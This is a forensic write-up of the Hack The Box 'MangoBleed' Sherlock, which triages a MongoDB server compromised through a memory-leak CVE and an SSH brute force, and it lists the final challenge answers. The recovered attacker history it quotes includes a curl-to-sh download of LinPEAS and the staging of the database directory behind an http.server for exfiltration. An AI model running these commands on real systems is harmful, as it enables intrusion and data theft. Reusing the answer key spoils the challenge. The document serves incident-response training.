# HTB Sherlock — "MangoBleed" (DFIR / Linux Triage)

**Category:** DFIR  
**Difficulty:** Very Easy

---

## Scenario

> You were contacted early this morning to handle a high-priority incident involving a suspected compromised server. The host, `mongodbsync`, is a secondary MongoDB server. According to the administrator, it is maintained once a month, and they recently became aware of a vulnerability referred to as **MongoBleed**. As a precaution, the administrator has provided root-level access to facilitate the investigation.

The evidence is a single archive, `MangoBleed.zip`, containing a **UAC** (Unix-like Artifacts Collector) triage acquisition of the server: `uac-mongodbsync-linux-triage/`.

```bash
unzip -P <password> MangoBleed.zip
```

> `unzip` may print a warning about a filename with non-ASCII characters (`NetLock_Arany_..._Főtanúsítvány.pem`). It is harmless: it concerns a system certificate, not evidence.

The goal is a rapid triage: determine whether the host was compromised, and identify the initial access, privilege-escalation attempts and data access / exfiltration.

---

## Tooling

- `grep`, `cut`, `sort`, `uniq` — to pivot quickly through large text logs
- `python3` — to parse the JSON-formatted MongoDB log and validate counts
- `cat` / `less` — to read shell histories and `auth.log`
- MITRE ATT&CK — to map the observed behaviour to known techniques

---

## Recon: Know Your Evidence

A UAC collection is organised in a predictable way. Only a few locations matter for this case:

```text
uac-mongodbsync-linux-triage/
├── [root]/                      # copy of selected files from the live filesystem
│   ├── var/log/mongodb/mongod.log   # MongoDB application log (JSON)
│   ├── var/log/auth.log             # SSH / sudo / PAM activity
│   ├── home/mongoadmin/.bash_history
│   └── etc/ssh/sshd_config
├── live_response/               # output of commands run during collection
│   ├── packages/dpkg_-l.txt         # installed packages and versions
│   └── system/last*.txt, lastb*.txt # login history
└── bodyfile/                    # filesystem timeline
```

The investigation logic is a classic pivot chain:

> **application log** (how did they get in?) → **auth log** (who logged in, and when?) → **shell history** (what did they do?)

The three sources answer three different questions, and none of them is sufficient alone.

### What is MongoBleed?

**CVE-2025-14847** is an unauthenticated memory-disclosure vulnerability in MongoDB, comparable in spirit to Heartbleed (hence the name). MongoDB accepts network messages compressed with zlib. An attacker sends a message that lies about its decompressed size, and the server answers with bytes from its own heap memory, which can contain credentials, tokens or fragments of documents. **No authentication is required.**

Consequence for the analyst: the attack leaves almost no application-level trace. There is no failed login and no suspicious query. The only footprint is a very large number of very short TCP connections.

---

## Task 1 — CVE ID of the vulnerability

The scenario names the vulnerability "MongoBleed". It is tracked as:

```text
CVE-2025-14847
```

**Answer:** `CVE-2025-14847`

---

## Task 2 — Version of MongoDB installed

Two independent sources agree. First, the package inventory collected by UAC:

```bash
grep -i mongodb live_response/packages/dpkg_-l.txt
```

```text
ii  mongodb-org-server   8.0.16   amd64   MongoDB open source document-oriented database system
```

Second, the MongoDB startup banner in `mongod.log`:

```bash
grep -o '"version":"[^"]*"' "[root]/var/log/mongodb/mongod.log" | sort | uniq -c
```

```text
3 "version":"8.0.16"
```

> **Pitfall:** the metapackage `mongodb-org-database` shows `8.0.17`. It is only a dependency bundle. The server that is actually installed and running is `mongodb-org-server` **8.0.16**.

The `auth.log` also confirms the administrator pinned this exact version during installation (`apt install -y mongodb-org=8.0.16 ...`).

**Answer:** `8.0.16`

---

## Task 3 — Attacker's remote IP address

`mongod.log` is written in JSON, and every network event carries a `remote` field. Counting the remote IPs is the fastest way to find the attacker:

```bash
grep -o '"remote":"[0-9.]*:[0-9]*"' "[root]/var/log/mongodb/mongod.log" \
  | cut -d'"' -f4 | cut -d: -f1 | sort | uniq -c | sort -rn
```

```text
75260 65.0.76.43
```

A single IP accounts for **every** connection recorded in the log. On a secondary server that should only talk to its replica set, this alone is a strong anomaly.

**Answer:** `65.0.76.43`

---

## Task 4 — Start of the exploitation

The earliest connection from the attacker is the first `Connection accepted` event:

```bash
grep '65.0.76.43' "[root]/var/log/mongodb/mongod.log" | head -2
```

```json
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"c":"NETWORK","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","connectionId":1,"connectionCount":1}}
{"t":{"$date":"2025-12-29T05:25:52.744+00:00"},"c":"NETWORK","msg":"Connection ended","attr":{"remote":"65.0.76.43:35340","connectionId":1,"connectionCount":0}}
```

The connection lives for **1 millisecond**: open, send the crafted compressed packet, read the leak, close. That is the signature of an automated exploit and not of a legitimate client. Notice also that no `client metadata` message is ever logged for these connections, whereas a real driver or `mongosh` identifies itself.

**Answer:** `2025-12-29 05:25:52` (UTC)

---

## Task 5 — Total number of malicious connections

Every attacker connection produces **two** log events: `Connection accepted` and `Connection ended`. The total number of events attributed to the attacker is the figure the challenge expects.

```bash
grep -c '65.0.76.43' "[root]/var/log/mongodb/mongod.log"
```

```text
75260
```

To understand what this number is made of, a short script separates the two event types:

```python
import json
acc = end = 0
for line in open("mongod.log", errors="ignore"):
    try:
        j = json.loads(line)
    except Exception:
        continue
    if j.get("msg") == "Connection accepted":
        acc += 1
    elif j.get("msg") == "Connection ended":
        end += 1
print(acc, end, acc + end)  # 37630 37630 75260
```

Additional observations from the same analysis:

- `connectionId` runs from **1 to 37630** without any gap, so there are exactly **37 630 distinct connections**.
- Every connection lasts between 0 and 13 ms.
- The activity is concentrated in about **75 seconds**: 5 786 connections in minute `05:25`, 26 556 in `05:26`, and 5 288 in `05:27` (last one at `05:27:07`).

> **Takeaway on counting:** "number of connections" can mean distinct connections (37 630) or log events (75 260). The platform expects the **75 260** log-event count, so when a flag is rejected, check whether the question counts *events* or *objects*.

**Answer:** `75260`

---

## Task 6 — Interactive hands-on remote access

The scenario hints that the attacker obtained sensitive data (consistent with a memory leak) and then brute-forced their way in. The place to look is `auth.log`.

First, the brute-force against the local account `mongoadmin`:

```bash
grep '65.0.76.43' "[root]/var/log/auth.log" | head
grep -c 'authentication failure.*rhost=65.0.76.43' "[root]/var/log/auth.log"
```

The first attacker line appears at `05:39:18`, followed by dozens of `pam_unix(sshd:auth): authentication failure` events and a `MaxStartups throttling` message, which shows the attacker was opening many parallel SSH connections. The SSH configuration explains why it works: `PasswordAuthentication yes` and `KbdInteractiveAuthentication yes` are both enabled.

Then two successful logins appear:

```text
05:39:24  sshd[39825]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056
05:39:24  session opened ... session closed (0.5 s later)   -> systemd-logind: Session 8

05:40:03  sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062
05:40:03  session opened for user mongoadmin                  -> systemd-logind: Session 10
05:42:04  sudo: mongoadmin : 1 incorrect password attempt ; TTY=pts/0 ; COMMAND=list
```

The two events must not be confused:

| Time | Duration | Nature |
|---|---|---|
| `05:39:24` | ~0.5 s | The brute-force tool found a valid password, authenticated, and disconnected immediately. No terminal is involved. |
| `05:40:03` | ~8 min (until `05:48:28`) | A human logs in, gets a TTY (`pts/0`), and starts typing commands (the `sudo` attempt at `05:42`). |

The question asks for the moment the attacker gained **interactive, hands-on** access, which is the second login.

**Answer:** `2025-12-29 05:40:03` (UTC)

---

## Task 7 — In-memory script used for privilege escalation

The attacker's commands are in the compromised user's shell history:

```bash
cat "[root]/home/mongoadmin/.bash_history"
```

```text
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```

The command is:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Why "in-memory"?** The script is piped straight from the network into `sh`. It is never written to disk, so file-based detection (antivirus, file hashing, disk forensics) sees nothing. **LinPEAS** is an enumeration script that hunts for privilege-escalation vectors (sudo rights, SUID binaries, writable services, credentials in files, and so on).

This matches the typical order of a hands-on intrusion: `whoami` → enumeration → privilege-escalation attempt, and it is consistent with the failed `sudo` at `05:42`.

**Answer:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

---

## Task 8 — Directory targeted for exfiltration

The end of the history shows the attacker's real objective:

```text
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3 -m http.server 6969
```

The sequence is a textbook staging-and-exfiltration pattern: enter the directory, install an archiving tool, compress the content, and publish it through a throwaway web server on port `6969`, which the attacker can then download from their own machine.

`/var/lib/mongodb` is the MongoDB **`dbPath`**, confirmed in the startup entry of `mongod.log`:

```json
{"msg":"MongoDB starting","attr":{"pid":1931,"port":27017,"dbPath":"/var/lib/mongodb", ...}}
```

It contains the raw database files, so the attacker was after the **entire database**.

> **Limitation:** `.bash_history` has no timestamps, so the order of commands is reliable but their exact time is not. Whether the archive was actually downloaded would need network telemetry, which is not part of this collection.

**Answer:** `/var/lib/mongodb`

---

## Incident Timeline (UTC, 2025-12-29)

| Time | Event | Source |
|---|---|---|
| 05:11:47 | MongoDB 8.0.16 installed and started | `auth.log`, `mongod.log` |
| 05:25:52 | First MongoBleed connection from `65.0.76.43` | `mongod.log` |
| 05:27:07 | Last exploit connection (37 630 connections, 75 260 events) | `mongod.log` |
| 05:39:18 | SSH brute-force on `mongoadmin` begins | `auth.log` |
| 05:39:24 | Brute-force succeeds (0.5 s automated session) | `auth.log` |
| 05:40:03 | **Interactive SSH session as `mongoadmin`** | `auth.log` |
| 05:42:04 | Failed `sudo` attempt (privilege-escalation attempt) | `auth.log` |
| after login | LinPEAS, `zip` install, `http.server 6969` in `/var/lib/mongodb` | `.bash_history` |
| 05:48:28 | Attacker session disconnects | `auth.log` |

> A separate `root` SSH login from a different IP (`119.73.124.129`) appears at `06:00:31`. The collected artifacts do not allow attributing it, and it is outside the scope of the tasks. It should be verified with the administrator.

---

## Mapping to MITRE ATT&CK

| Observed behaviour | Technique |
|---|---|
| Exploiting MongoBleed on an exposed MongoDB service | T1190 — Exploit Public-Facing Application |
| Mass SSH password guessing against `mongoadmin` | T1110.001 — Brute Force: Password Guessing |
| Logging in with a valid local account | T1078.003 — Valid Accounts: Local Accounts |
| Remote access over SSH | T1021.004 — Remote Services: SSH |
| Interactive commands in a shell | T1059.004 — Command and Scripting Interpreter: Unix Shell |
| Downloading LinPEAS with `curl` and piping it to `sh` | T1105 — Ingress Tool Transfer |
| LinPEAS enumeration / failed `sudo` | T1083 — File and Directory Discovery, T1548.003 — Sudo and Sudo Caching |
| Reading the MongoDB data directory | T1005 — Data from Local System |
| Compressing the data with `zip` | T1560.001 — Archive Collected Data: Archive via Utility |
| Serving data with `python3 -m http.server` | T1048.003 — Exfiltration Over Alternative Protocol: Unencrypted Non-C2 Protocol |

---

## Final Answers

| Task | Answer |
|---|---|
| 1 | `CVE-2025-14847` |
| 2 | `8.0.16` |
| 3 | `65.0.76.43` |
| 4 | `2025-12-29 05:25:52` |
| 5 | `75260` |
| 6 | `2025-12-29 05:40:03` |
| 7 | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| 8 | `/var/lib/mongodb` |

---

## Initial Assessment and Recommended Next Steps

**Assessment:** the server is **compromised**. An unauthenticated memory-disclosure exploit was used against MongoDB, followed within minutes by an SSH brute-force that gave the attacker hands-on access as `mongoadmin`. The attacker attempted privilege escalation and staged the MongoDB data directory for exfiltration. Whether the data was actually retrieved cannot be proven from these artifacts alone.

**Recommended next steps:**

1. **Contain:** isolate the host from the network and block `65.0.76.43` at the perimeter.
2. **Patch:** upgrade MongoDB to a fixed release (check the vendor advisory for CVE-2025-14847) and, until then, disable zlib network compression.
3. **Reduce exposure:** do not expose port `27017` to the Internet; restrict it to the replica-set peers.
4. **Rotate secrets:** assume everything in MongoDB's memory was leaked. Rotate the `mongoadmin` password, all database credentials, API keys and any secret stored in documents.
5. **Harden SSH:** disable password and keyboard-interactive authentication, enforce key-based login, and add rate limiting / `fail2ban`.
6. **Investigate further:** check network logs for traffic to port `6969` to determine whether data left the host, look for persistence (cron, `authorized_keys`, systemd units), and clarify the `root` login from `119.73.124.129`.
7. **Review impact:** treat the content of `/var/lib/mongodb` as potentially breached and assess notification obligations.

---

## Takeaways

- **Pivot between sources.** The application log explains *how*, `auth.log` explains *who and when*, and the shell history explains *what*. Each one alone leaves a gap.
- **Count first, read later.** `sort | uniq -c | sort -rn` on a field such as the remote IP finds the attacker in seconds, even in a 75 000-line log.
- **Not every successful login is hands-on.** A 0.5-second session is automation; look for a TTY and follow-up activity to find the human.
- **Read the question's unit.** "Number of connections" can be 37 630 (objects) or 75 260 (events). Validating counts with a script helps identify which one is expected.
- **Memory-disclosure bugs leave quiet traces.** There are no failed logins and no queries, only a burst of millisecond-long connections. Detection relies on volume and timing.
- **Fileless does not mean traceless.** `curl | sh` never touches the disk, but the shell history still records it.
- **Know the limits of your evidence.** `.bash_history` has no timestamps and a host-only triage cannot prove exfiltration; say so in the report.

---

## References

- Hack The Box — Sherlock "MangoBleed": https://app.hackthebox.com/sherlocks/MangoBleed
- UAC (Unix-like Artifacts Collector): https://github.com/tclahr/uac
- PEASS-ng / LinPEAS: https://github.com/carlospolop/PEASS-ng
- MITRE ATT&CK T1190 — Exploit Public-Facing Application: https://attack.mitre.org/techniques/T1190/
- MITRE ATT&CK T1110.001 — Brute Force: Password Guessing: https://attack.mitre.org/techniques/T1110/001/
- MITRE ATT&CK T1078.003 — Valid Accounts: Local Accounts: https://attack.mitre.org/techniques/T1078/003/
- MITRE ATT&CK T1105 — Ingress Tool Transfer: https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1560.001 — Archive Collected Data: Archive via Utility: https://attack.mitre.org/techniques/T1560/001/
- MITRE ATT&CK T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol: https://attack.mitre.org/techniques/T1048/003/
